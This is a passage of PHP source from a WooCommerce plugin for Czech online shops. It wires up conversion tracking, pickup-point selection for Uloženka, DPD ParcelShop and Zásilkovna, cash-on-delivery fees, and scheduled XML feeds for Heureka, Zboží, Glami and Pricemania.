    add_action( 'woocommerce_checkout_order_processed', 'ceske_sluzby_heureka_overeno_zakazniky', 10, 2 );
    add_action( 'woocommerce_review_order_before_submit', 'ceske_sluzby_heureka_overeno_zakazniky_souhlas' );
    add_action( 'woocommerce_thankyou', 'ceske_sluzby_heureka_mereni_konverzi' );
    add_action( 'woocommerce_thankyou', 'ceske_sluzby_zbozi_mereni_konverzi' );
    add_action( 'woocommerce_thankyou', 'ceske_sluzby_sklik_mereni_konverzi' );
    add_action( 'woocommerce_thankyou', 'ceske_sluzby_srovname_mereni_konverzi' );
    add_action( 'wp_footer', 'ceske_sluzby_sklik_retargeting' );
    add_filter( 'wc_order_is_editable', 'ceske_sluzby_moznost_menit_dobirku', 10, 2 );
    add_filter( 'woocommerce_package_rates', 'ceske_sluzby_omezit_dopravu_pokud_dostupna_zdarma', 10, 2 );

    add_action( 'woocommerce_review_order_after_shipping', 'ceske_sluzby_ulozenka_zobrazit_pobocky' );
    add_action( 'woocommerce_new_order_item', 'ceske_sluzby_ulozenka_ulozeni_pobocky', 10, 2 );
    add_action( 'woocommerce_checkout_process', 'ceske_sluzby_ulozenka_overit_pobocku' );
    add_action( 'woocommerce_admin_order_data_after_billing_address', 'ceske_sluzby_ulozenka_objednavka_zobrazit_pobocku' );
    add_action( 'woocommerce_email_after_order_table', 'ceske_sluzby_ulozenka_objednavka_zobrazit_pobocku' );
    add_action( 'woocommerce_order_details_after_order_table', 'ceske_sluzby_ulozenka_objednavka_zobrazit_pobocku' );

    add_action( 'woocommerce_review_order_after_shipping', 'ceske_sluzby_dpd_parcelshop_zobrazit_pobocky' );
    add_action( 'woocommerce_new_order_item', 'ceske_sluzby_dpd_parcelshop_ulozeni_pobocky', 10, 2 );
    add_action( 'woocommerce_checkout_process', 'ceske_sluzby_dpd_parcelshop_overit_pobocku' );
    add_action( 'woocommerce_admin_order_data_after_billing_address', 'ceske_sluzby_dpd_parcelshop_objednavka_zobrazit_pobocku' );
    add_action( 'woocommerce_email_after_order_table', 'ceske_sluzby_dpd_parcelshop_objednavka_zobrazit_pobocku' );
    add_action( 'woocommerce_order_details_after_order_table', 'ceske_sluzby_dpd_parcelshop_objednavka_zobrazit_pobocku' );

    $aktivace_zasilkovna = get_option( 'wc_ceske_sluzby_doprava_zasilkovna' );
    if ( $aktivace_zasilkovna == ""yes"" ) {
      add_action( 'woocommerce_shipping_init', 'ceske_sluzby_doprava_zasilkovna_init' );
      add_filter( 'woocommerce_shipping_methods', 'ceske_sluzby_doprava_zasilkovna' );
      $zasilkovna_settings = get_option( 'woocommerce_ceske_sluzby_zasilkovna_settings' );
      if ( isset( $zasilkovna_settings['zasilkovna_api-klic'] ) && ! empty( $zasilkovna_settings['zasilkovna_api-klic'] ) ) {
        add_action( 'wp_footer', 'ceske_sluzby_zasilkovna_scripts_checkout', 100 );
        add_action( 'woocommerce_review_order_after_shipping', 'ceske_sluzby_zasilkovna_zobrazit_pobocky' );
        add_action( 'woocommerce_new_order_item', 'ceske_sluzby_zasilkovna_ulozeni_pobocky', 10, 2 );
        add_action( 'woocommerce_checkout_process', 'ceske_sluzby_zasilkovna_overit_pobocku' );
        add_action( 'woocommerce_admin_order_data_after_billing_address', 'ceske_sluzby_zasilkovna_objednavka_zobrazit_pobocku' );
        add_action( 'woocommerce_email_after_order_table', 'ceske_sluzby_zasilkovna_objednavka_zobrazit_pobocku' );
        add_action( 'woocommerce_order_details_after_order_table', 'ceske_sluzby_zasilkovna_objednavka_zobrazit_pobocku' );
      }
    }
    add_filter( 'woocommerce_pay4pay_cod_amount', 'ceske_sluzby_ulozenka_dobirka_pay4pay' );
    add_filter( 'woocommerce_pay4pay_cod_amount', 'ceske_sluzby_dpd_parcelshop_dobirka_pay4pay' );

    $aktivace_recenzi = get_option( 'wc_ceske_sluzby_heureka_recenze_obchodu-aktivace' );
    if ( $aktivace_recenzi == ""yes"" ) {
      add_shortcode( 'heureka-recenze-obchodu', 'ceske_sluzby_heureka_recenze_obchodu' );
    }

    $sledovani_zasilek = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_sledovani-zasilek' );
    if ( $sledovani_zasilek == ""yes"" ) {
      add_filter( 'woocommerce_email_classes', 'ceske_sluzby_sledovani_zasilek_email' );
      if ( version_compare( WC_VERSION, '3.2', '>=' ) ) {
        add_filter( 'woocommerce_email_actions', 'ceske_sluzby_sledovani_zasilek_email_akce' );
      }
    }

    $aktivace_eet = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_eet-aktivace' );
    if ( $aktivace_eet == ""yes"" ) {
      add_filter( 'upload_mimes', 'ceske_sluzby_povolit_nahravani_certifikatu' );
      require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-eet.php';
      add_action( 'wpo_wcpdf_after_order_details', 'ceske_sluzby_zobrazit_eet_faktura_externi', 10, 2 );
      add_action( 'woocommerce_order_status_completed', 'ceske_sluzby_automaticky_ziskat_uctenku' );
      add_action( 'woocommerce_payment_complete', 'ceske_sluzby_automaticky_ziskat_uctenku' );
      add_action( 'woocommerce_email_order_meta', 'ceske_sluzby_zobrazit_eet_email', 10, 4 );
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        add_filter( 'woocommerce_order_tax_totals', 'ceske_sluzby_doplnit_danovou_sazbu' );
      } else {
        add_filter( 'woocommerce_order_get_tax_totals', 'ceske_sluzby_doplnit_danovou_sazbu' );
      }
    }

    $aktivace_dodaci_doby = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_dodaci_doba-aktivace' );
    if ( $aktivace_dodaci_doby == ""yes"" ) {
      $dodaci_doba = get_option( 'wc_ceske_sluzby_dodaci_doba_zobrazovani' );
      if ( ! empty( $dodaci_doba ) ) {
        foreach ( $dodaci_doba as $zobrazeni ) {
          if ( $zobrazeni == 'get_availability_text' ) {
            // Původně použitý filtr woocommerce_get_availability_text je funkční až od WooCommerce 2.6.2
            // https://github.com/woocommerce/woocommerce/commit/33346938855b334861678bccecef4a58e5fc0cfa
            add_filter( 'woocommerce_get_availability', 'ceske_sluzby_zobrazit_dodaci_dobu_filtr', 10, 2 );
            add_action( 'woocommerce_before_add_to_cart_form', 'ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_akce' );
            add_filter( 'woocommerce_available_variation', 'ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_filtr', 10, 3 );
          }
          if ( $zobrazeni == 'before_add_to_cart_form' ) {
            add_action( 'woocommerce_before_add_to_cart_form', 'ceske_sluzby_zobrazit_dodaci_dobu_akce' );
            if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
              add_filter( 'woocommerce_stock_html', 'ceske_sluzby_nahradit_zobrazeny_text_deprecated', 10, 3 );
            } else {
              add_filter( 'woocommerce_get_stock_html', 'ceske_sluzby_nahradit_zobrazeny_text', 10, 2 );
            }
            add_action( 'woocommerce_before_add_to_cart_form', 'ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_akce' );
            add_filter( 'woocommerce_available_variation', 'ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_filtr', 10, 3 );
          }
          if ( $zobrazeni == 'after_shop_loop_item' ) {
            add_action( 'woocommerce_after_shop_loop_item', 'ceske_sluzby_zobrazit_dodaci_dobu_akce', 8 );
            add_action( 'woocommerce_after_shop_loop_item', 'ceske_sluzby_zobrazit_dodatecnou_dodaci_dobu_akce', 9 );
          }
        }
      }
      add_filter( 'woocommerce_admin_stock_html', 'ceske_sluzby_zobrazeni_dodaci_doby_administrace', 10, 2 );
      add_action( 'woocommerce_variation_header', 'ceske_sluzby_zobrazeni_dodaci_doby_varianty' );
      add_action( 'admin_head', 'ceske_sluzby_zobrazeni_dodaci_doby_administrace_css' );
    }

    add_action( 'admin_enqueue_scripts', 'ceske_sluzby_load_admin_scripts' );
    add_action( 'wp_footer', 'ceske_sluzby_heureka_certifikat_spokojenosti' ); // Pouze pro eshop nebo na celém webu?
    add_action( 'woocommerce_cart_calculate_fees', 'ceske_sluzby_zaokrouhlovani_poplatek' );
    add_action( 'woocommerce_after_calculate_totals', 'ceske_sluzby_spustit_zaokrouhlovani' );
    add_action( 'wp_footer', 'ceske_sluzby_aktualizovat_checkout_javascript' );
    add_filter( 'woocommerce_available_payment_gateways', 'ceske_sluzby_dostupne_platebni_metody' );

    $nepresne_zaokrouhleni = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_nepresne-zaokrouhleni' );
    if ( $nepresne_zaokrouhleni == ""yes"" ) {
      add_filter( 'woocommerce_calc_tax', 'ceske_sluzby_zmena_kalkulace_dani' );
      add_filter( 'woocommerce_tax_round', 'ceske_sluzby_zmena_zaokrouhlovani_dani' );
    }
    $zmena_platby_predem = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_zmena-platby-predem' );
    if ( $zmena_platby_predem == ""yes"" ) {
      add_filter( 'woocommerce_bacs_process_payment_order_status','ceske_sluzby_zmena_stavu_objednavky_platba_predem', 10, 2 );
      add_filter( 'woocommerce_email_actions', 'ceske_sluzby_moznost_odesilat_emaily_zmena_stavu_platba_predem' );
      add_action( 'woocommerce_email', 'ceske_sluzby_zmena_emailovych_notifikaci_platba_predem' );
      add_action( 'init', 'ceske_sluzby_odebrat_bankovni_ucet_po_dokonceni_objednavky', 100 );
      add_action( 'admin_head', 'ceske_sluzby_stylovani_tlacitek_objednavky_administrace_css' );
    }
  }
}
add_action( 'plugins_loaded', 'ceske_sluzby_kontrola_aktivniho_pluginu' );

function ceske_sluzby_doprava_ulozenka_init() {
  if ( ! class_exists( 'WC_Shipping_Ceske_Sluzby_Ulozenka' ) ) {
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-ulozenka.php';
  }
}
 
function ceske_sluzby_doprava_ulozenka( $methods ) {
  $methods[] = 'WC_Shipping_Ceske_Sluzby_Ulozenka';
  return $methods;
}

function ceske_sluzby_ulozenka_zobrazit_pobocky() {
  if ( is_ajax() ) {
    // Do budoucna možná použít spíše woocommerce_checkout_update_order_review
    $ulozenka_branches = '';
    if ( isset( $_POST['post_data'] ) ) {
      parse_str( $_POST['post_data'], $post_data );
      if ( isset( $post_data['ulozenka_branches'] ) ) {
        $ulozenka_branches = $post_data['ulozenka_branches'];
      }
    }
    $available_shipping = WC()->shipping->load_shipping_methods();
    $chosen_shipping_method = WC()->session->get( 'chosen_shipping_methods' );
    $settings = array();
    if ( $chosen_shipping_method[0] == ""ceske_sluzby_ulozenka"" ) {
      $settings = $available_shipping[ $chosen_shipping_method[0] ]->settings;
      if ( $settings['enabled'] == ""yes"" && ! empty( $settings['ulozenka_id-obchodu'] ) ) {
        $json_class = new Ceske_Sluzby_Json_Loader();
        // http://docs.ulozenkav3.apiary.io/#pepravnsluby
        $zeme = WC()->customer->get_shipping_country();
        if ( $zeme == ""CZ"" ) { $zeme_code = ""CZE""; }
        if ( $zeme == ""SK"" ) { $zeme_code = ""SVK""; }
        $parametry = array( 'provider' => 1, 'country' => $zeme_code ); ?>
        <tr class=""ulozenka"">
          <td>
            <img src=""https://www.ulozenka.cz/logo/ulozenka.png"" width=""140"" border=""0"">
          </td>
          <td>
            <font size=""2"">Uloženka - výběr pobočky:</font><br>
            <div id=""ulozenka-branch-select-options"">
              <select name=""ulozenka_branches"">
                <option>Vyberte pobočku</option>
                <?php $json = $json_class->load( $parametry );
                if ( isset( $json->data->destination ) && ! empty( $json->data->destination ) ) {
                  $pobocky = $json_class->sortName( $json->data->destination );
                  foreach ( $pobocky as $pobocka ) {
                    echo '<option value=""' . $pobocka . '""' . selected( $pobocka, $ulozenka_branches ) . '>' . $pobocka . '</option>';
                  }
                } ?>
              </select>
            </div>
          </td>
        </tr>
      <?php }
    }
  }
}

function ceske_sluzby_ulozenka_ulozeni_pobocky( $item_id, $item ) {
  if ( isset( $_POST[""ulozenka_branches""] ) ) {
    if ( $_POST[""ulozenka_branches""] && $_POST[""shipping_method""][0] == ""ceske_sluzby_ulozenka"" ) {
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        $item_type = $item['order_item_type'];
      } else {
        $item_type = $item->get_type();
      }
      if ( $item_type == 'shipping' ) {
        wc_add_order_item_meta( $item_id, 'ceske_sluzby_ulozenka_pobocka_nazev', esc_attr( $_POST['ulozenka_branches'] ), true );
      }
    }
  }
}

function ceske_sluzby_ulozenka_overit_pobocku() {
  if ( isset( $_POST[""ulozenka_branches""] ) ) {
    if ( $_POST[""ulozenka_branches""] == ""Vyberte pobočku"" && $_POST[""shipping_method""][0] == ""ceske_sluzby_ulozenka"" ) {
      wc_add_notice( 'Pokud chcete doručit zboží prostřednictvím Uloženky, zvolte prosím pobočku.', 'error' );
    }
  }
}

function ceske_sluzby_ulozenka_objednavka_zobrazit_pobocku( $order ) {
  if ( $order->has_shipping_method( 'ceske_sluzby_ulozenka' ) ) {
    foreach ( $order->get_shipping_methods() as $shipping_item_id => $shipping_item ) {
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        $pobocka = $order->get_item_meta( $shipping_item_id, 'ceske_sluzby_ulozenka_pobocka_nazev', true );
      } else {
        $pobocka = wc_get_order_item_meta( $shipping_item_id, 'ceske_sluzby_ulozenka_pobocka_nazev', true );
      }
      if ( ! empty( $pobocka ) ) {
        echo ""<p><strong>Uloženka:</strong> "" . $pobocka . ""</p>"";
      }
    }
  }
}

function ceske_sluzby_ulozenka_dobirka_pay4pay( $amount ) {
  $available_shipping = WC()->shipping->load_shipping_methods();
  $chosen_shipping_method = WC()->session->get( 'chosen_shipping_methods' );
  if ( $chosen_shipping_method[0] == ""ceske_sluzby_ulozenka"" ) {
    $settings = $available_shipping[ $chosen_shipping_method[0] ]->settings;
    $zeme = WC()->customer->get_shipping_country();
    if ( $zeme == ""CZ"" ) {
      if ( ! empty( $settings['ulozenka_dobirka'] ) ) {
        $amount = $settings['ulozenka_dobirka'];
      } 
    }
    if ( $zeme == ""SK"" ) {
      if ( ! empty( $settings['ulozenka_dobirka-slovensko'] ) ) {
        $amount = $settings['ulozenka_dobirka-slovensko'];
      }
    }
    if ( class_exists( 'WOOCS' ) ) {
      $amount = apply_filters( 'woocs_exchange_value', $amount );
    }
  }
  return $amount;
}

function ceske_sluzby_doprava_dpd_parcelshop_init() {
  if ( ! class_exists( 'WC_Shipping_Ceske_Sluzby_DPD_ParcelShop' ) ) {
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-dpd-parcelshop.php';
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-json-loader.php';
  }
}
 
function ceske_sluzby_doprava_dpd_parcelshop( $methods ) {
  $methods[] = 'WC_Shipping_Ceske_Sluzby_DPD_ParcelShop';
  return $methods;
}

function ceske_sluzby_dpd_parcelshop_zobrazit_pobocky() {
  if ( is_ajax() ) {
    $dpd_parcelshop_branches = '';
    if ( isset( $_POST['post_data'] ) ) {
      parse_str( $_POST['post_data'], $post_data );
      if ( isset( $post_data['dpd_parcelshop_branches'] ) ) {
        $dpd_parcelshop_branches = $post_data['dpd_parcelshop_branches'];
      }
    }
    $available_shipping = WC()->shipping->load_shipping_methods();
    $chosen_shipping_method = WC()->session->get( 'chosen_shipping_methods' );
    $settings = array();
    if ( $chosen_shipping_method[0] == ""ceske_sluzby_dpd_parcelshop"" ) {
      $settings = $available_shipping[ $chosen_shipping_method[0] ]->settings;
      if ( $settings['enabled'] == ""yes"" ) {
        $json_class = new Ceske_Sluzby_Json_Loader();
        $zeme = WC()->customer->get_shipping_country();
        if ( $zeme == ""CZ"" ) { $zeme_code = ""CZE""; }
        if ( $zeme == ""SK"" ) { $zeme_code = ""SVK""; }
        $parametry = array( 'provider' => 5, 'country' => $zeme_code ); ?>
        <tr class=""dpd-parcelshop"">
          <td>
            <img src=""http://www.dpdparcelshop.cz/images/DPD-logo.png"" width=""140"" border=""0"">
          </td>
          <td>
            <font size=""2"">DPD ParcelShop - výběr pobočky:</font><br>
            <div id=""dpd-parcelshop-branch-select-options"">
              <select name=""dpd_parcelshop_branches"">
                <option>Vyberte pobočku</option>
                <?php $json = $json_class->load( $parametry );
                if ( isset( $json->data->destination ) && ! empty( $json->data->destination ) ) {
                  $pobocky = $json_class->sortName( $json->data->destination );
                  foreach ( $pobocky as $pobocka ) {
                    echo '<option value=""' . $pobocka . '""' . selected( $pobocka, $dpd_parcelshop_branches ) . '>' . $pobocka . '</option>';
                  }
                } ?>
              </select>
            </div>
          </td>
        </tr>
      <?php }
    }
  }
}

function ceske_sluzby_dpd_parcelshop_ulozeni_pobocky( $item_id, $item ) {
  if ( isset( $_POST[""dpd_parcelshop_branches""] ) ) {
    if ( $_POST[""dpd_parcelshop_branches""] && $_POST[""shipping_method""][0] == ""ceske_sluzby_dpd_parcelshop"" ) {
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        $item_type = $item['order_item_type'];
      } else {
        $item_type = $item->get_type();
      }
      if ( $item_type == 'shipping' ) {
        wc_add_order_item_meta( $item_id, 'ceske_sluzby_dpd_parcelshop_pobocka_nazev', esc_attr( $_POST['dpd_parcelshop_branches'] ), true );
      }
    }
  }
}

function ceske_sluzby_dpd_parcelshop_overit_pobocku() {
  if ( isset( $_POST[""dpd_parcelshop_branches""] ) ) {
    if ( $_POST[""dpd_parcelshop_branches""] == ""Vyberte pobočku"" && $_POST[""shipping_method""][0] == ""ceske_sluzby_dpd_parcelshop"" ) {
      wc_add_notice( 'Pokud chcete doručit zboží prostřednictvím DPD ParcelShop, zvolte prosím pobočku.', 'error' );
    }
  }
}

function ceske_sluzby_dpd_parcelshop_objednavka_zobrazit_pobocku( $order ) {
  if ( $order->has_shipping_method( 'ceske_sluzby_dpd_parcelshop' ) ) {
    foreach ( $order->get_shipping_methods() as $shipping_item_id => $shipping_item ) {
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        $pobocka = $order->get_item_meta( $shipping_item_id, 'ceske_sluzby_dpd_parcelshop_pobocka_nazev', true );
      } else {
        $pobocka = wc_get_order_item_meta( $shipping_item_id, 'ceske_sluzby_dpd_parcelshop_pobocka_nazev', true );
      }
      if ( ! empty( $pobocka ) ) {
        echo ""<p><strong>DPD ParcelShop:</strong> "" . $pobocka . ""</p>"";
      }
    }
  }
}

function ceske_sluzby_dpd_parcelshop_dobirka_pay4pay( $amount ) {
  $available_shipping = WC()->shipping->load_shipping_methods();
  $chosen_shipping_method = WC()->session->get( 'chosen_shipping_methods' );
  if ( $chosen_shipping_method[0] == ""ceske_sluzby_dpd_parcelshop"" ) {
    $settings = $available_shipping[ $chosen_shipping_method[0] ]->settings;
    $zeme = WC()->customer->get_shipping_country();
    if ( $zeme == ""CZ"" ) {
      if ( ! empty( $settings['dpd_parcelshop_dobirka'] ) ) {
        $amount = $settings['dpd_parcelshop_dobirka'];
      }
    }
    if ( $zeme == ""SK"" ) {
      if ( ! empty( $settings['dpd_parcelshop_dobirka-slovensko'] ) ) {
        $amount = $settings['dpd_parcelshop_dobirka-slovensko'];
      }
    }
    if ( class_exists( 'WOOCS' ) ) {
      $amount = apply_filters( 'woocs_exchange_value', $amount );
    }
  }
  return $amount;
}

function ceske_sluzby_doprava_zasilkovna_init() {
  if ( ! class_exists( 'WC_Shipping_Ceske_Sluzby_Zasilkovna' ) ) {
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-zasilkovna.php';
  }
}
 
function ceske_sluzby_doprava_zasilkovna( $methods ) {
  $methods['ceske_sluzby_zasilkovna'] = 'WC_Shipping_Ceske_Sluzby_Zasilkovna';
  return $methods;
}

function ceske_sluzby_zasilkovna_zobrazit_pobocky() {
  if ( is_ajax() ) {
    $zasilkovna_branches = '';
    if ( isset( $_POST['post_data'] ) ) {
      parse_str( $_POST['post_data'], $post_data );
      if ( isset( $post_data['packeta-point-id'] ) ) {
        $zasilkovna_branches = $post_data['packeta-point-id'];
      }
    }
    $chosen_shipping_method = WC()->session->get( 'chosen_shipping_methods' );
    if ( strpos( $chosen_shipping_method[0], ""ceske_sluzby_zasilkovna"" ) !== false ) { ?>
      <tr class=""zasilkovna"">
        <td>
          <img src=""https://files.packeta.com/web/images/page/Zasilkovna_logo_WEB_tb_nove.png"" width=""200"" border=""0"">
        </td>
        <td>
          <input type=""button"" onclick=""Packeta.Widget.pick(packetaApiKey, showSelectedPickupPoint)"" value=""Zvolit pobočku"">
          <div>Pobočka:
            <input type=""hidden"" id=""packeta-point-id"" name=""packeta-point-id"" value=""<?php echo $zasilkovna_branches; ?>"">
            <span id=""packeta-point-info"" style=""font-weight:bold;""><?php if ( $zasilkovna_branches ) { echo $zasilkovna_branches; } else { echo ""Zatím nevybráno""; } ?></span>
          </div>
        </td>
      </tr>
    <?php } else { ?>
      <input type=""hidden"" id=""packeta-point-id"" name=""packeta-point-id"" value=""<?php echo $zasilkovna_branches; ?>"">
    <?php }
  }
}

function ceske_sluzby_zasilkovna_ulozeni_pobocky( $item_id, $item ) {
  if ( isset( $_POST[""packeta-point-id""] ) ) {
    if ( ! empty( $_POST[""packeta-point-id""] ) && strpos( $_POST[""shipping_method""][0], ""ceske_sluzby_zasilkovna"" ) !== false ) {
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        $item_type = $item['order_item_type'];
      } else {
        $item_type = $item->get_type();
      }
      if ( $item_type == 'shipping' ) {
        wc_add_order_item_meta( $item_id, 'ceske_sluzby_zasilkovna_pobocka_nazev', esc_attr( $_POST['packeta-point-id'] ), true );
      }
    }
  }
}

function ceske_sluzby_zasilkovna_overit_pobocku() {
  if ( isset( $_POST[""packeta-point-id""] ) ) {
    if ( empty( $_POST[""packeta-point-id""] ) && strpos( $_POST[""shipping_method""][0], ""ceske_sluzby_zasilkovna"" ) !== false ) {
      wc_add_notice( 'Pokud chcete doručit zboží prostřednictvím Zásilkovny, zvolte prosím pobočku.', 'error' );
    }
  }
}

function ceske_sluzby_zasilkovna_objednavka_zobrazit_pobocku( $order ) {
  if ( $order->has_shipping_method( 'ceske_sluzby_zasilkovna' ) ) {
    foreach ( $order->get_shipping_methods() as $shipping_item_id => $shipping_item ) {
      if ( version_compare( WC_VERSION, '3.0', '<' ) ) {
        $pobocka = $order->get_item_meta( $shipping_item_id, 'ceske_sluzby_zasilkovna_pobocka_nazev', true );
      } else {
        $pobocka = wc_get_order_item_meta( $shipping_item_id, 'ceske_sluzby_zasilkovna_pobocka_nazev', true );
      }
      if ( ! empty( $pobocka ) ) {
        echo ""<p><strong>Zásilkovna:</strong> "" . $pobocka . ""</p>"";
      }
    }
  }
}

function ceske_sluzby_moznost_menit_dobirku( $zmena, $objednavka ) {
  // https://www.separatista.net/forum/tema/woocommerce-a-dobirka
  $moznost_zmeny = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_dobirka-zmena' );
  $status = $objednavka->get_status();
  if ( $moznost_zmeny == ""yes"" && $status == ""processing"" ) {
    $zmena = true;
  }
  return $zmena;
}

add_action( 'init', 'ceske_sluzby_aktivace_xml_feed' );
function ceske_sluzby_aktivace_xml_feed() {
  $aktivace_xml = get_option( 'wc_ceske_sluzby_heureka_xml_feed-aktivace' );
  if ( $aktivace_xml == ""yes"" ) {
    require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-xml.php';
    add_feed( 'heureka', 'xml_feed_zobrazeni' );
    add_feed( 'glami', 'xml_feed_zobrazeni' );
    add_feed( 'zbozi', 'zbozi_xml_feed_zobrazeni' );
    add_feed( 'google', 'google_xml_feed_zobrazeni' );

    $heureka_xml = get_option( 'wc_ceske_sluzby_xml_feed_heureka-aktivace' );
    if ( $heureka_xml == ""yes"" ) {
      if ( ! wp_next_scheduled( 'ceske_sluzby_heureka_aktualizace_xml' ) ) {
        wp_schedule_event( current_time( 'timestamp', 1 ), 'daily', 'ceske_sluzby_heureka_aktualizace_xml' );
      }
    } else {
      if ( wp_next_scheduled( 'ceske_sluzby_heureka_aktualizace_xml' ) ) {
        $timestamp = wp_next_scheduled( 'ceske_sluzby_heureka_aktualizace_xml' );
        wp_unschedule_event( $timestamp, 'ceske_sluzby_heureka_aktualizace_xml' ); 
      }
    }
    
    $zbozi_xml = get_option( 'wc_ceske_sluzby_xml_feed_zbozi-aktivace' );
    if ( $zbozi_xml == ""yes"" ) {
      if ( ! wp_next_scheduled( 'ceske_sluzby_zbozi_aktualizace_xml' ) ) {
        wp_schedule_event( current_time( 'timestamp', 1 ) + MINUTE_IN_SECONDS, 'daily', 'ceske_sluzby_zbozi_aktualizace_xml' );
      }
    } else {
      if ( wp_next_scheduled( 'ceske_sluzby_zbozi_aktualizace_xml' ) ) {
        $timestamp = wp_next_scheduled( 'ceske_sluzby_zbozi_aktualizace_xml' );
        wp_unschedule_event( $timestamp, 'ceske_sluzby_zbozi_aktualizace_xml' ); 
      }
    }

    $pricemania_xml = get_option( 'wc_ceske_sluzby_xml_feed_pricemania-aktivace' );
    if ( $pricemania_xml == ""yes"" ) {
      if ( ! wp_next_scheduled( 'ceske_sluzby_pricemania_aktualizace_xml' ) ) {
        wp_schedule_event( current_time( 'timestamp', 1 ) + ( 2 * MINUTE_IN_SECONDS ), 'daily', 'ceske_sluzby_pricemania_aktualizace_xml' );
      }
    } else {
      if ( wp_next_scheduled( 'ceske_sluzby_pricemania_aktualizace_xml' ) ) {
        $timestamp = wp_next_scheduled( 'ceske_sluzby_pricemania_aktualizace_xml' );
        wp_unschedule_event( $timestamp, 'ceske_sluzby_pricemania_aktualizace_xml' );
      }
    }

    $glami_xml = get_option( 'wc_ceske_sluzby_xml_feed_glami-aktivace' );
    if ( $glami_xml == ""yes"" ) {
      if ( ! wp_next_scheduled( 'ceske_sluzby_glami_aktualizace_xml' ) ) {
        wp_schedule_event( current_time( 'timestamp', 1 ) + ( 3 * MINUTE_IN_SECONDS ), 'daily', 'ceske_sluzby_glami_aktualizace_xml' );
      }
    } else {
      if ( wp_next_scheduled( 'ceske_sluzby_glami_aktualizace_xml' ) ) {
        $timestamp = wp_next_scheduled( 'ceske_sluzby_glami_aktualizace_xml' );
        wp_unschedule_event( $timestamp, 'ceske_sluzby_glami_aktualizace_xml' ); 
      }
    }
  } else {
    if ( wp_next_scheduled( 'ceske_sluzby_heureka_aktualizace_xml' ) ) {
      $timestamp = wp_next_scheduled( 'ceske_sluzby_heureka_aktualizace_xml' );
      wp_unschedule_event( $timestamp, 'ceske_sluzby_heureka_aktualizace_xml' );
    }
    if ( wp_next_scheduled( 'ceske_sluzby_zbozi_aktualizace_xml' ) ) {
      $timestamp = wp_next_scheduled( 'ceske_sluzby_zbozi_aktualizace_xml' );
      wp_unschedule_event( $timestamp, 'ceske_sluzby_zbozi_aktualizace_xml' );
    }
    if ( wp_next_scheduled( 'ceske_sluzby_pricemania_aktualizace_xml' ) ) {
      $timestamp = wp_next_scheduled( 'ceske_sluzby_pricemania_aktualizace_xml' );
      wp_unschedule_event( $timestamp, 'ceske_sluzby_pricemania_aktualizace_xml' );
    }
    if ( wp_next_scheduled( 'ceske_sluzby_glami_aktualizace_xml' ) ) {
      $timestamp = wp_next_scheduled( 'ceske_sluzby_glami_aktualizace_xml' );
      wp_unschedule_event( $timestamp, 'ceske_sluzby_glami_aktualizace_xml' );
    }
  }
}

add_action( 'ceske_sluzby_heureka_aktualizace_xml', 'ceske_sluzby_heureka_xml_feed_aktualizace' );
add_action( 'ceske_sluzby_heureka_aktualizace_xml_batch', 'ceske_sluzby_heureka_xml_feed_aktualizace' );
function ceske_sluzby_heureka_xml_feed_aktualizace() {
  require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-xml.php';
  xml_feed_aktualizace_nastaveni( 'heureka' );
}

add_action( 'ceske_sluzby_glami_aktualizace_xml', 'ceske_sluzby_glami_xml_feed_aktualizace' );
add_action( 'ceske_sluzby_glami_aktualizace_xml_batch', 'ceske_sluzby_glami_xml_feed_aktualizace' );
function ceske_sluzby_glami_xml_feed_aktualizace() {
  require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-xml.php';
  xml_feed_aktualizace_nastaveni( 'glami' );
}

add_action( 'ceske_sluzby_zbozi_aktualizace_xml', 'ceske_sluzby_zbozi_xml_feed_aktualizace' );
add_action( 'ceske_sluzby_zbozi_aktualizace_xml_batch', 'ceske_sluzby_zbozi_xml_feed_aktualizace' );
function ceske_sluzby_zbozi_xml_feed_aktualizace() {
  require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-xml.php';
  zbozi_xml_feed_aktualizace();
}

add_action( 'ceske_sluzby_pricemania_aktualizace_xml', 'ceske_sluzby_pricemania_xml_feed_aktualizace' );
add_action( 'ceske_sluzby_pricemania_aktualizace_xml_batch', 'ceske_sluzby_pricemania_xml_feed_aktualizace' );
function ceske_sluzby_pricemania_xml_feed_aktualizace() {
  require_once plugin_dir_path( __FILE__ ) . 'includes/class-ceske-sluzby-xml.php';
  pricemania_xml_feed_aktualizace();
}

// https://docs.woothemes.com/document/hide-other-shipping-methods-when-free-shipping-is-available/
function ceske_sluzby_omezit_dopravu_pokud_dostupna_zdarma( $rates, $package ) {
  $omezit_dopravu = get_option( 'wc_ceske_sluzby_dalsi_nastaveni_doprava-pouze-zdarma' );
  if ( $omezit_dopravu == ""yes"" ) {
    $rates_omezeno = array();
    if ( version_compare( WC_VERSION, '2.6', '<' ) ) {
      if ( isset( $rates['free_shipping'] ) ) {
        $free_shipping = $rates['free_shipping'];
        if ( isset( $rates['local_pickup'] ) ) {
          $local_pickup = $rates['local_pickup'];
        }
        $rates_omezeno['free_shipping'] = $free_shipping;
        if ( isset( $local_pickup ) ) {
          $rates_omezeno['local_pickup'] = $local_pickup;
        }
      }
    } else {
      if ( isset( $rates['legacy_free_shipping'] ) ) {
        $free_shipping = $rates['legacy_free_shipping'];
